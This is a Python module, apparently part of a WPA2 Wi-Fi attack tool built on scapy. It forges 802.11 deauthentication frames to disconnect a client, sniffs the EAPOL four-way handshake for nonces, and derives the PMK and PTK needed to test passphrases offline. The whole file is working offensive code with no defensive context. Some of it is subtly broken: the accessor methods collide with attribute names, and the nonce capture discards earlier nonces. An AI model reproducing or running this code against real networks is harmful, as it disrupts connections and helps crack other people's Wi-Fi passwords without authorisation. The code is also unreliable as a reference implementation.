#capture module
import threading
import os
import time
import random
from scapy.all import *
import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5


class WPA2:
    def __init__(self, apMac, staMac, aNonce, sNonce, ssid):
        self.apMac = apMac
        self.staMac = staMac
        self.aNonce = aNonce
        self.sNonce = sNonce
        self.ssid = ssid
    
    def apMac(self):
        return self.apMac
    
    def staMac(self):
        return self.staMac
    
    def aNonce(self):
        return self.aNonce
    
    def sNonce(self):
        return self.sNonce
    
    def ssid(self):
        return self.ssid
    

class capturemodule():
    
    F_nonces = []
    
    def deauth(self, staMac, apMac, count, iface):
        dot11 = Dot11(addr1=staMac, addr2=apMac, addr3=apMac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=count, iface=iface, verbose=1)

    def getnonce(self, pkt) :
        nonces =[]
        #if pkt.haslayer(dot11):
        if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 and pkt.haslayer(WPA_key):
            nonces.append(pkt.getlayer(WPA_key).nonce)
        self.F_nonces = nonces
        
    def capture4way(self, iface, ch, sec) :
        os.system('iwconfig %s channel %d' % (iface, ch))
        sniff(iface=iface, prn=self.getnonce, timeout=sec)
        
    # F_nonces[0], F_nonces[1] = aNonce, sNonce
    
    def PRF(self, key, A, B):
        # Number of bytes in the PTK
        nByte = 64
        i = 0
        R = b''
        # Each iteration produces 160-bit value and 512 bits are required
        while (i <= ((nByte * 8 + 159) / 160)):
            hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
            R = R + hmacsha1.digest()
            i += 1
        return R[0:nByte]


    def MakeAB(self, aNonce, sNonce, apMac, cliMac):
        A = b"Pairwise key expansion"
        B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
        return (A, B)


    def makePMK(self, pwd, ssid):
        pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        return pmk


    def makePTK(self, pmk, A, B):
        ptk = self.PRF(pmk, A, B)
        return ptk